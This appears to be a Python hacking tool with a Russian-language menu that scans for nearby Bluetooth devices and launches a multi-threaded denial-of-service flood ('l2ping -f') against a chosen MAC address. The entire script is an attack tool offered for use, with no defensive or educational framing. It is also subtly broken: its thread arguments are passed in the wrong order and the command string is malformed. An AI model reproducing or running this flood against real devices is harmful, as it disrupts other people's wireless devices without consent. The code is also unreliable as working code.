import os
import threading
import time
from colorama import Fore, Back, Style


def DOS(Adapt, target_addr, packages_size):
    os.system('l2ping -i hci' + str(Adapt) + '-s ' + str(packages_size) + ' -f ' + target_addr)


def main():
        print(Fore.BLUE + "╔╗────────╔╗───╔═╗\n║╚╗╔╗─╔╦╗╔╝║╔═╗║═╣\n║╬║║╚╗║║║║╬║║╬║╠═║\n╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝" + Style.RESET_ALL + Fore.GREEN + "\nCoded by: YarikMilk" + Style.RESET_ALL)
        hb = input(Fore.GREEN + "Инструменты:"  + Style.RESET_ALL + Fore.RED + "\n1.Сканер" + Style.RESET_ALL + Fore.BLUE + "\n2.Dos" + Style.RESET_ALL + Fore.YELLOW + "\nВыбор: " + Style.RESET_ALL)
        if hb == "2":
            target_addr = input(Fore.YELLOW + 'MAC адрес устройства: ' + Style.RESET_ALL)

            if len(target_addr) < 1:
                print(Fore.RED + '[!] Ошибка: Адрес неверен или отсутствует' + Style.RESET_ALL)
                exit(0)
            try:
                 packages_size = int(input(Fore.YELLOW + 'Размер пакетов: ' + Style.RESET_ALL))
            except:
                print(Fore.RED + '[!] Ошибка: Пакеты неверно указаны или отсутствуют' + Style.RESET_ALL)
                exit(0)
            try:
                threads_count = int(input(Fore.YELLOW + 'Кол-во сессий: ' + Style.RESET_ALL))
            except:
                print(Fore.RED + '[!] Ошибка: Сессии неверно написаны или отсутствуют' + Style.RESET_ALL)
                exit(0)
            try:
                Adapt = input(Fore.YELLOW + 'Номер вашего адаптера hci: ' + Style.RESET_ALL)
            except:
                print(Fore.RED + '[!] Ошибка: Номер адаптера введён неверно!' + Style.RESET_ALL)
                exit(0)
            print('')
            os.system('clear')

            print(Fore.YELLOW + "[*] Начало атаки через 3...")

            for i in range(0, 3):
                 print('[*] ' + str(3 - i))
                 time.sleep(1)
            os.system('clear')
            print(Style.RESET_ALL)
            print(Fore.GREEN + '[*] Создание сессий...\n' + Style.RESET_ALL)
            print(Fore.BLUE)

            for i in range(0, threads_count):
                print('[*] Сессия №' + str(i + 1))
                threading.Thread(target=DOS, args=[str(target_addr), str(packages_size), str(Adapt)]).start()

            print(Style.RESET_ALL + Fore.GREEN + '[*] Сессии созданы успешно...' + Style.RESET_ALL)
            print(Fore.YELLOW + '[*] Запуск...' + Style.RESET_ALL)
        elif hb == "1":
            Adapt1 = input(Fore.YELLOW + 'Номер вашего адаптера hci: ' + Style.RESET_ALL)
            os.system('clear')
            print(Fore.RED + '[!]' + Style.RESET_ALL + Fore.GREEN + 'После сканирования программа автоматически закроется' + Style.RESET_ALL)
            os.system('hcitool -i hci' + str(Adapt1) + ' scan')
            exit(0)
            
if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print(Fore.RED + '\n[*] Отменено' + Style.RESET_ALL)
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print(Fore.RED + '[!] Ошибка: ' + str(e) + Style.RESET_ALL)